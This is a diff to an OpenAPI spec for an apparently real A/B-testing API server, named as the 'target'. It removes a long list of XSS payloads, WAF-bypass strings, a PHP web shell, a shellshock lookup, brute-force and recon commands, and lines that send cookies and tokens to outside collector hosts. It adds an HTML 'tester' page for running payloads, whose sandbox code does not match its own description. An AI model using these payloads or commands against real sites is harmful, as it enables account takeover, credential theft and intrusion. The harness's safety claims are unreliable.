@@ -1,315 +1,47 @@
 {
   "openapi": "3.0.0",
   "info": {
-    "title": "A/B Splitter API (Sanitized for local testing)",
+    "title": "A/B Splitter API + Safe HTML Tester (embedded)",
     "version": "1.0.0",
-    "description": "Sanitized OpenAPI 3.0 spec for the A/B experiments API. XSS payloads are preserved under the non-standard extension `x-payloads` as plain strings. This file is safe to open locally in Swagger UI because payloads are data only and not injected into rendered HTML fields."
+    "description": "Sanitized OpenAPI spec with a non-executing HTML tester embedded as an example. Load this locally in Swagger UI, open GET /tools/html-tester, copy the HTML from the example, save to a file, and run it only in an isolated VM."
   },
   "servers": [
     {
       "url": "https://ab-splitter.xsolla.com",
-      "description": "Primary API server (target)."
+      "description": "Target API server (for actual API calls)."
     }
   ],
   "paths": {
-    "/health/liveness": {
+    "/tools/html-tester": {
       "get": {
-        "summary": "Liveness check",
-        "description": "Returns service liveness status.",
+        "summary": "Get HTML tester (as text example)",
+        "description": "Returns the full HTML tester page as a string inside the response example. **This is safe**: Swagger UI will show the HTML as code/text. Copy it out and run only in an isolated environment if you wish to execute it.",
         "responses": {
           "200": {
-            "description": "OK",
+            "description": "HTML tester page (string) in example",
             "content": {
               "application/json": {
                 "schema": {
-                  "type": "object"
-                }
-              }
-            }
-          },
-          "503": {
-            "description": "Service Unavailable"
-          }
-        }
-      }
-    },
-    "/health/readiness": {
-      "get": {
-        "summary": "Readiness check",
-        "description": "Returns service readiness status.",
-        "responses": {
-          "200": {
-            "description": "OK",
-            "content": {
-              "application/json": {
-                "schema": {
-                  "type": "object"
-                }
-              }
-            }
-          },
-          "503": {
-            "description": "Service Unavailable"
-          }
-        }
-      }
-    },
-    "/v3/split/by_user_id": {
-      "post": {
-        "summary": "Split user by user_id",
-        "description": "Assigns a user to an experiment group using user_id.",
-        "requestBody": {
-          "required": true,
-          "content": {
-            "application/json": {
-              "schema": {
-                "type": "object",
-                "properties": {
-                  "experiment_uuid": {
-                    "type": "string"
-                  },
-                  "user_id": {
-                    "type": "string"
+                  "type": "object",
+                  "properties": {
+                    "filename": { "type": "string", "example": "xss-tester.html" },
+                    "html": { "type": "string", "description": "The HTML content as a string (escaped in JSON)" }
                   }
                 },
-                "required": [
-                  "user_id"
-                ]
-              },
-              "examples": {
-                "example1": {
-                  "value": {
-                    "experiment_uuid": "exp-uuid-1",
-                    "user_id": "user-123"
+                "examples": {
+                  "safeHtmlTester": {
+                    "summary": "HTML tester (copy-save-run in isolated VM)",
+                    "value": {
+                      "filename": "xss-tester.html",
+                      "html": "<!doctype html>\\n<html lang=\\\"en\\\">\\n<head>\\n<meta charset=\\\"utf-8\\\" />\\n<meta name=\\\"viewport\\\" content=\\\"width=device-width,initial-scale=1\\\" />\\n<title>XSS Payload Tester (Safe harness)</title>\\n<style>\\n  body { font-family: system-ui, -apple-system, Roboto, \\\"Segoe UI\\\", Arial; margin: 0; background: #f6f8fa; color:#111; }\\n  header { background:#0b5fff; color:white; padding:14px 18px; }\\n  main { padding:18px; display:flex; gap:18px; }\\n  #left { width: 50%; max-height:80vh; overflow:auto; background: #fff; border:1px solid #ddd; padding:12px; border-radius:6px; }\\n  #right { width:50%; display:flex; flex-direction:column; gap:12px; }\\n  .payload-row { padding:8px; border-bottom:1px solid #eee; display:flex; gap:8px; align-items:flex-start; }\\n  .payload-text { white-space:pre-wrap; font-family: monospace; background:#fafafa; padding:6px; border-radius:4px; border:1px solid #eee; flex:1; overflow:auto; max-height:120px;}\\n  .btn { padding:6px 10px; border-radius:6px; border:1px solid #bbb; background:#fff; cursor:pointer; }\\n  .btn-primary { background:#0b5fff; color:#fff; border-color:#0a4bd1; }\\n  .btn-danger { background:#ff4d4f; color:#fff; border-color:#c42b2b; }\\n  footer { padding:12px; font-size:13px; color:#555; }\\n  .controls { display:flex; gap:8px; margin-bottom:8px; }\\n  input[type=\\\"search\\\"] { flex:1; padding:6px 8px; border-radius:6px; border:1px solid #ccc; }\\n  #iframeHost { border:1px dashed #bbb; border-radius:6px; height:420px; background:white; overflow:hidden; }\\n  .meta { font-size:13px; color:#666; }\\n</style>\\n</head>\\n<body>\\n<header>\\n  <strong>XSS Payload Tester — Safe Local Harness</strong>\\n</header>\\n\\n<main>\\n  <section id=\\\"left\\\">\\n    <div style=\\\"display:flex; gap:8px; margin-bottom:8px;\\\">\\n      <input id=\\\"searchBox\\\" type=\\\"search\\\" placeholder=\\\"Search payloads (substring)...\\\" />\\n      <button id=\\\"refreshBtn\\\" class=\\\"btn\\\">Reload</button>\\n      <button id=\\\"showAllBtn\\\" class=\\\"btn\\\">Show All</button>\\n    </div>\\n\\n    <div id=\\\"payloadList\\\" aria-live=\\\"polite\\\">\\n      Loading payloads.json...\\n    </div>\\n  </section>\\n\\n  <section id=\\\"right\\\">\\n    <div>\\n      <div class=\\\"meta\\\"><strong>Instructions (READ CAREFULLY)</strong></div>\\n      <ol>\\n        <li>Run this only <strong>locally in an isolated VM/container</strong>. Network should be disabled or proxied through an intercepting proxy if you want to observe requests.</li>\\n        <li>Payloads are stored in <code>payloads.json</code> — this page only loads them and displays them as text.</li>\\n        <li>Click <em>Run</em> to execute a single payload inside a sandboxed iframe with a strict Content-Security-Policy that blocks network and external resources.</li>\\n        <li>Do <strong>not</strong> upload this file to any production or public service.</li>\\n      </ol>\\n    </div>\\n\\n    <div>\\n      <div class=\\\"meta\\\"><strong>Sandbox iframe (execution target)</strong></div>\\n      <div id=\\\"iframeHost\\\">\\n        <iframe id=\\\"sandbox\\\" style=\\\"width:100%;height:100%;border:0;\\\" sandbox=\\\"allow-scripts\\\"></iframe>\\n      </div>\\n      <div style=\\\"margin-top:8px;\\\">\\n        <button id=\\\"clearIframe\\\" class=\\\"btn\\\">Clear iframe</button>\\n        <button id=\\\"openInNew\\\" class=\\\"btn\\\">Open last payload in new window (unsafe)</button>\\n      </div>\\n      <div class=\\\"meta\\\" style=\\\"margin-top:8px;\\\">Note: sandboxed iframe uses <code>Content-Security-Policy</code> that blocks network (<code>connect-src 'none'</code>, <code>img-src 'none'</code>) and does not use allow-same-origin. Scripts can run but cannot exfiltrate to the network.</div>\\n    </div>\\n\\n    <div>\\n      <div class=\\\"meta\\\"><strong>Last executed payload (for quick copy)</strong></div>\\n      <textarea id=\\\"lastPayload\\\" rows=\\\"6\\\" style=\\\"width:100%;font-family:monospace;\\\" readonly></textarea>\\n      <div style=\\\"margin-top:8px;\\\">\\n        <button id=\\\"copyLast\\\" class=\\\"btn\\\">Copy last payload</button>\\n      </div>\\n    </div>\\n  </section>\\n</main>\\n\\n<footer>\\n  <strong>Safety:</strong> This harness is designed to reduce accidental exfiltration, but it is not bulletproof. Run in an isolated environment. The author of this harness is not responsible for misuse.\\n</footer>\\n\\n<script>\\n(async function(){\\n  // Load payloads.json from same folder\\n  async function loadPayloads(){\\n    try{\\n      const res = await fetch('payloads.json', {cache:'no-store'});\\n      if(!res.ok) throw new Error('payloads.json not found or not accessible. HTTP ' + res.status);\\n      const obj = await res.json();\\n      if(!Array.isArray(obj.payloads)) throw new Error('Invalid payloads.json format: expected { \\\"payloads\\\": [ ... ] }');\\n      return obj.payloads;\\n    }catch(err){\\n      console.error(err);\\n      return null;\\n    }\\n  }\\n\\n  // Helper: escape text for display (not for execution)\\n  function escapeHtml(s){\\n    return String(s)\\n      .replace(/&/g, '&amp;')\\n      .replace(/</g, '&lt;')\\n      .replace(/>/g, '&gt;')\\n      .replace(/\\\"/g, '&quot;')\\n      .replace(/'/g, '&#39;');\\n  }\\n\\n  // Render list\\n  const payloadListEl = document.getElementById('payloadList');\\n  const searchBox = document.getElementById('searchBox');\\n  const refreshBtn = document.getElementById('refreshBtn');\\n  const showAllBtn = document.getElementById('showAllBtn');\\n  const clearIframeBtn = document.getElementById('clearIframe');\\n  const openInNewBtn = document.getElementById('openInNew');\\n  const lastPayloadArea = document.getElementById('lastPayload');\\n  const copyLastBtn = document.getElementById('copyLast');\\n\\n  let payloads = [];\\n  let filtered = [];\\n  let lastExecuted = '';\\n\\n  async function init(){\\n    payloadListEl.innerHTML = 'Loading payloads.json...';\\n    const p = await loadPayloads();\\n    if(!p){\\n      payloadListEl.innerHTML = '<div style=\\\"color:#900; padding:12px;\\\">Failed to load <code>payloads.json</code>. Place the file into this folder and reload the page.</div>';\n      return;\\n    }\\n    payloads = p;\\n    filtered = payloads.slice();\\n    renderList(filtered);\\n  }\\n\\n  function renderList(list){\\n    if(!list || list.length === 0){\\n      payloadListEl.innerHTML = '<div style=\\\"padding:12px;color:#555\\\">No payloads matched.</div>';\\n      return;\\n    }\\n    const frag = document.createDocumentFragment();\\n    list.forEach((pl, idx) => {\\n      const row = document.createElement('div');\\n      row.className = 'payload-row';\\n      const pre = document.createElement('div');\\n      pre.className = 'payload-text';\\n      pre.innerHTML = escapeHtml(pl);\\n      const controls = document.createElement('div');\\n      controls.style.display = 'flex';\\n      controls.style.flexDirection = 'column';\\n      controls.style.gap = '6px';\\n      const copyBtn = document.createElement('button');\\n      copyBtn.className = 'btn';\\n      copyBtn.textContent = 'Copy';\\n      copyBtn.onclick = () => { navigator.clipboard.writeText(pl).then(()=>{ copyBtn.textContent='Copied'; setTimeout(()=>copyBtn.textContent='Copy',900); }); };\n      const runBtn = document.createElement('button');\\n      runBtn.className = 'btn btn-primary';\\n      runBtn.textContent = 'Run';\\n      runBtn.onclick = async () => {\\n        const confirmRun = confirm('Execute this payload inside a sandboxed iframe? You confirmed authorization and must run in an isolated environment. Proceed?');\\n        if(!confirmRun) return;\\n        runPayloadInSandbox(pl);\\n        lastPayloadArea.value = pl;\\n        lastExecuted = pl;\\n      };\n      const viewBtn = document.createElement('button');\\n      viewBtn.className = 'btn';\\n      viewBtn.textContent = 'View raw';\\n      viewBtn.onclick = () => { window.open().document.write('<pre>'+escapeHtml(pl)+'</pre>'); };\n      controls.appendChild(copyBtn);\\n      controls.appendChild(runBtn);\\n      controls.appendChild(viewBtn);\\n      row.appendChild(pre);\\n      row.appendChild(controls);\\n      frag.appendChild(row);\\n    });\\n    payloadListEl.innerHTML = '';\\n    payloadListEl.appendChild(frag);\\n  }\\n\\n  function runPayloadInSandbox(payload){\\n    const iframe = document.getElementById('sandbox');\\n    // Build a safe HTML that sets a strict CSP and uses sandbox without allow-same-origin\\n    const safeDoc = `<!doctype html><meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'none'; style-src 'unsafe-inline';\\\"><div><pre>${escapeHtml(payload)}</pre></div><script>try{ /* payload runs here if it contains script tags */ }catch(e){console.error(e);}<\/script>`;\n    // Blob + URL approach to avoid network and origin exposure\n    const blob = new Blob([safeDoc], {type:'text/html'});\n    const url = URL.createObjectURL(blob);\n    iframe.src = url;\\n  }\\n\\n  // Wire controls\\n  refreshBtn.onclick = init;\\n  showAllBtn.onclick = () => { filtered = payloads.slice(); renderList(filtered); searchBox.value = ''; };\\n  searchBox.oninput = () => { const q = searchBox.value.toLowerCase(); filtered = payloads.filter(p=>p.toLowerCase().includes(q)); renderList(filtered); };\n  clearIframeBtn.onclick = () => { const iframe = document.getElementById('sandbox'); iframe.src = 'about:blank'; lastPayloadArea.value = ''; lastExecuted = ''; };\n  openInNewBtn.onclick = () => { if(!lastExecuted){ alert('No payload executed yet.'); return;} const w = window.open(); w.document.write('<pre>'+escapeHtml(lastExecuted)+'</pre>'); };\n  copyLastBtn.onclick = () => { if(!lastExecuted){ alert('No payload executed yet.'); return;} navigator.clipboard.writeText(lastExecuted); };\n\n  // init on load\\n  await init();\\n})();\\n</script>\\n</body>\\n</html>"
+                    }
                   }
                 }
               }
             }
-          }
-        },
-        "responses": {
-          "200": {
-            "description": "OK",
-            "content": {
-              "application/json": {
-                "schema": {
-                  "type": "object"
-                }
-              }
-            }
-          },
-          "400": {
-            "description": "Bad Request"
-          },
-          "404": {
-            "description": "Not Found"
-          },
-          "500": {
-            "description": "Internal Server Error"
           }
         }
       }
     }
-  },
-  "components": {},
-  "x-payloads": [
-    "foo\"><script src=//dtf.pw/2.js><script><x=\".com",
-    "http://foo?%26apos;-alert()-%26apos;",
-    "\" onfocus=\"alert(1)\" name=\"bounty",
-    "(Append #bounty to the URL and enjoy your zero interaction XSS )",
-    "<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//",
-    "# Internet Explorer, Edge",
-    "<svg><script>alert(1)<p>",
-    "# Firefox",
-    "<svg><x><script>alert(1)</x>",
-    "# Common",
-    "< = %C0%BC = %E0%80%BC = %F0%80%80%BC",
-    "> = %C0%BE = %E0%80%BE = %F0%80%80%BE",
-    "' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7",
-    "\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2",
-    "'';!--\"<XSS>=&{()}",
-    "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
-    "<IMG SRC=\"javascript:alert('XSS');\">",
-    "<IMG SRC=javascript:alert('XSS')>",
-    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-    "<IMG SRC=javascript:alert(\"XSS\")>",
-    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
-    "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
-    "<a onmouseover=alert(document.cookie)>xxs link</a>",
-    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
-    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
-    "<IMG SRC=# onmouseover=\"alert('xxs')\">",
-    "<IMG SRC= onmouseover=\"alert('xxs')\">",
-    "<IMG onmouseover=\"alert('xxs')\">",
-    "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
-    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
-    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
-    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
-    "<IMG SRC=\"jav\tascript:alert('XSS');\">",
-    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
-    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
-    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
-    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
-    "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
-    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
-    "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
-    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
-    "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
-    "<SCRIPT SRC=//ha.ckers.org/.j>",
-    "<IMG SRC=\"javascript:alert('XSS')\"",
-    "<iframe src=http://ha.ckers.org/scriptlet.html>",
-    "\\\";alert('XSS');//",
-    "\"oncut=\"alert()",
-    "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
-    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
-    "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
-    "<IMG DYNSRC=\"javascript:alert('XSS')\">",
-    "<IMG LOWSRC=\"javascript:alert('XSS')\">",
-    "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
-    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
-    "<IMG SRC=\"livescript:[code]\">",
-    "<BODY ONLOAD=alert('XSS')>",
-    "<Svg only=1 OLoad=confirm(1)>",
-    "\"onmouseover=alert('xss') x=\"",
-    "<input><input\"/onmouseover=\"confirm(document.domain);//\"onload=onload><input><innerHTML><img+src=\"https://wallpapercave.com/wp/wp1836582.jpg\" width=\"1000\" height=\"750\" alt=\"onmouseover=prompt(1);//\" /></a></input>",
-    "#\"><a href=javaSCRIPT&colon;alert(document.domain)>click ",
-    "<img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ76c8RC-DDeVG7fxBSInMzNNEJOtQafxfZgLkkxRYT85XsR9osvA\" heigh=\"400\" width=\"600\"> </a> <div x=\"",
-    "\"/><svg/on<script>load=prompt(document.domain);>\"/><svg/on<script>load=prompt(document.cookie);>",
-    "injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)",
-    "<a onmouseover=\"try{const{shell}=require('electron'); console.log(shell)}catch(e){console.error(e)}\">Hover ME</a>",
-    "<a onmouseover=\"try{const{shell}=require('electron'); shell.openPath('/System/Application/Calculator.app/')}catch(e){console.error(e)}\">Hover ME</a>",
-    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=file://<responder_ip>/leak/leak.png",
-    "<iframe src=file://10.0.2.15:1234></iframe>",
-    "echo livedemo.xsolla..com | waybackurls | gf xss | qsreplace '\"><img src=x onerror=alert(1);>' | freq ",
-    "hydra -l user -p password 10.10.10.10 http-post-form \"/login.php:username=^USER^&password=^PASS^&form=submit:Invalid Credentilas (message)\"",
-    "<?php",
-    "phpinfo();",
-    "phpinfo(INFO_MODULES);",
-    "?>",
-    "`+ADw-script+AD4-alert()+ADw-/script+AD4-`",
-    "http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E ",
-    "</sCripT><sCripT>alert(document.domain)</sCripT>",
-    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=sftp://youtube.com;watch-sn96aVA2;x- proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/\">",
-    "%7B%7Bconstructor.constructor(%27alert(1991)%27)()%7D%7D",
-    "{{%%if'boom'=='boom'%%}}a{{%%endif%%}} ",
-    "'><marquee onstart=\"[cookie].find(confirm)\">",
-    "<?php echo shell_exec($_GET[‘e’].’ 2>&1'); ?>",
-    "<br><BR><BR><BR><h1>pwn<br><iframe onload=j() src=\\\"/etc/passwd\\\">xssxsxxsxs</iframe><script type=\\\"text/javascript\\\">function j(){alert('pwned contents of /etc/passwd:\\n\\n '+frames[0].document.body.innerText)}</script>",
-    "<a/HREF\"javas%26%2399;ript:%0Athrow onerror=al\\u0065rt,document.cooki\\u0065\">clickHERE",
-    "xss%27);}}});alert(documet.cookie);$(function+a(){a();});$(function+a(){if(a){}else+if(a){/*///",
-    "<svg width=\"500\" height=\"500\">",
-    "  <rect x=\"0\" y=\"0\" width=\"500\" height=\"500\" stroke=\"black\" fill=\"none\"/>",
-    "  <!-- Script element -->",
-    "  <script type=\"text/javascript\">",
-    "    var payload = \"<text x='50' y='100' font-size='36'><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//xss.report/c/boom670\");a.send();</script>;",
-    "    var parser = new DOMParser();",
-    "    var svgDoc = parser.parseFromString(payload, \"image/svg+xml\");",
-    "    var svgElement = svgDoc.documentElement;",
-    "    document.documentElement.appendChild(svgElement);",
-    "  </script>",
-    "</svg>",
-    "        <script> ",
-    "                var domain = document.domain;",
-    " /               alert(\"Domain Name: \" + domain);",
-    "        </script>",
-    "\"><script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action',http://frasg1d8rmrv6l6quv9yfepez55wtmhb.oastify.com/');</script>",
-    "<!DOCTYPE html>",
-    "<html>",
-    "  <head>",
-    "    <title>My Webpage</title>",
-    "    <script>",
-    "      x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action',http://frasg1d8rmrv6l6quv9yfepez55wtmhb.oastify.com/');",
-    "    </script>",
-    "  </head>",
-    "  <body>",
-    "    <h1>clikme</h1>",
-    "  </body>",
-    "</html>",
-    "image%20id=xss%20onfoc%3C!%3Eusin+alert(0)%0c",
-    "amass enum -active -d liveagent.com -brute -w /home/uchiha/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt",
-    "cat amass.txt | aquatone -ports xlarge -out aqua_$1",
-    "nuclei -l aqua_$1/aquatone_urls.txt -es info -o nuclei_$1.txt",
-    "() { :; }; /usr/bin/nslookup $(whoami).9w6w9glrejm03qqmjv4h8ccl5cb3ztni.oastify.com",
-    "X-Originating-IP: bing.com",
-    "X-Forwarded-For: bing.com",
-    "X-Remote-IP: bing.com",
-    "X-Remote-Addr: bing.com",
-    "X-Client-IP: bing.com",
-    "X-Forwarded-Host: bing.com",
-    "X-Host: bing.com",
-    "X-Forwarded-Server: bing.com",
-    "\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(document.doma\"in)>",
-    "\"><Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==\"))>",
-    "\"></script><script src=//xss.report/s/uboom18></script>",
-    "\"><a/\\test=\"%26quot;x%26quot;\"herf='01javascript:/*%b1*/;location.assign(\"//eog1vy7d7p1w4gj.m.pipedream.net/stealthy?x=\"+location)'>Click",
-    "h1'><script>alert(%27H1%27)</script>",
-    "<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>",
-    "   <html><body><head><meta content=\"text/html; charset=utf-8\"></meta></head>",
-    "  <div style=\"text-align: center;\"><form Method=\"GET\" Action=\"http://www.google.com/\">",
-    "  Phishingpage :<br /><br/>Username :<br /> <input name=\"User\" /><br />Password :<br /> ",
-    "  <input name=\"Password\" type=\"password\" /><br /><br /><input name=\"Valid\" value=\"Ok !\" type=\"submit\" />",
-    "  <br /></form></div></body></html>",
-    "<input><input\"/onmouseover=\"confirm(3333);//\"onload=onload><input><innerHTML><img src=\"https://www.petmd.com/sites/default/files/Acute-Dog-Diarrhea-47066074.jpg\" width=\"1000\" height=\"750\" alt=\"onmouseover=prompt(1);//\" /></a></input>",
-    "<a href=\"#\" onmouseover=\"alert(1)\">Hover over me</a>",
-    "<script>document.write('<img src=\"http://fzir5tu8zzk1n6hpjvkw6fr5mwsxgo4d.oastify.com?c='+document.cookie+'\" />');</script>",
-    "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a(window.origin) x>",
-    "%3cdETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a()%20x%3e",
-    "<a href=javaSCRIPT&colon;alert(window.origin)>boom</a>",
-    "<a href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;>clickme</a>",
-    "<a%20href=\"j%26Tab;a%26Tab;v%26Tab;asc%26NewLine;ri%26Tab;pt%26colon;%26lpar;a%26Tab;l%26Tab;e%26Tab;r%26Tab;t%26Tab;(document.domain)%26rpar;\">clickme</a>",
-    "<a href=\\\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\\\">X</a> ",
-    "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />tap",
-    "<a/href=\"j%0A%0Davascript%26colon;%26lpar;a%26Tab;l%26Tab;e%26Tab;r%26Tab;t%26Tab;(document.domain)%26rpar;\">clickme</a>",
-    "<a/href=\\\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\\\" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)",
-    "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(document.domain)\" />click ",
-    "%3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(%2finfected%2f%2esource)%22%20%2f%3eclick",
-    "%3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(document.domain)%22%20%2f%3eclick",
-    "#\"></div><a href=javascript&colon;alert&lpar;document&period;domain)>clickme</a>",
-    "javascript:top[/al/.source+/ert/.source](document.domain)  -->  we can use [ window, self, parent, frames[0], globalThis ] other than top\".",
-    "Akamai WAf:",
-    "';k='e'%0Atop['al'+k+'rt'](1)//",
-    "'\"><A HRef=\\\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>",
-    "CloudFlare WAf:",
-    "<svg/onload=window[\"al\"+\"ert\"]1337>",
-    "<Img Src=OnXSS OnError=confirm(1337)>",
-    "<Svg Only=1 OnLoad=confirm(document.domain)>",
-    "<svg onload=alert&#0000000040document.cookie)>",
-    "<sVG/oNLY%3d1/**/On+ONloaD%3dco\\u006efirm%26%23x28%3b%26%23x29%3b>",
-    "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E",
-    "<Img Src=//Xss.is OnLoad%0C=import(Src)>",
-    "<Svg Only=1 OnLoad=confirm(atob(\\\"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\\\"))>",
-    "Cloudfront Waf:",
-    "\">'><details/open/ontoggle=confirm('XSS')>",
-    "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
-    "';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//",
-    "\">%0D%0A%0D%0A<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>",
-    "Mod security:",
-    "<svg onload='new Function[\"Y000!\"].find(al\\u0065rt)'>",
-    "Imperva Waf:",
-    "<Img Src=//Xss.is OnLoad%0C=import(Src)>",
-    "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\">",
-    "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>",
-    "&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
-    "accesskey=%27x%27onclick=%27alert(1). --> by clicking \u0018control+option+x ",
-    "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(/ChromeCanary/)\" style=\"content-visibility:auto\">",
-    "<p oncontentvisibilityautostatechange=\"alert(/FirefoxOnly/)\" style=\"content-visibility:auto\">",
-    "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>",
-    "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';",
-    "\"><input%252bTyPE%25253d\"hxlxmj\"%252bSTyLe%25253d\"display%25253anone%25253b\"%252bonfocus%25253d\"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b\"%252boNMo%25252bUseOVer%25253d\"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b\"%252bAuToFOcus>",
-    "token=;script-sr-elem%20'unsafe-inline'",
-    "\" onclick=l&#92;u{6F}cati&#92;u{6F}n.href=\"javascript:alert(1)\">",
-    "<style>",
-    "url(cid://\\00003c\\000073\\000063\\000072\\000069\\000070\\000074\\00003e",
-    "  fetch('//attacker.com?'+document.cookie)",
-    "\\00003c\\00002f\\000073\\000063\\000072\\000069\\000070\\000074\\00003e);",
-    "</style>",
-    "<pre data-sourcepos=\"&#34;%22 href=&#34;x\"></pre>",
-    "<base href=\"https://attacker.com\">  <!-- Hijack resources -->",
-    "<pre x=&#34;\">",
-    "<code></code></pre>",
-    "<style>*{all:unset !important;display:block !important;background:black !important;color:lime !important;font-size:30px !important}</style>",
-    "<address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
-    "javascript:navigator.sendBeacon('https://tinyurl.com/3vt53acc','token='+encodeURIComponent(localStorage.getItem('token')))",
-    "VIjUApPDzbh0bLPV"
-  ]
+  }
 }
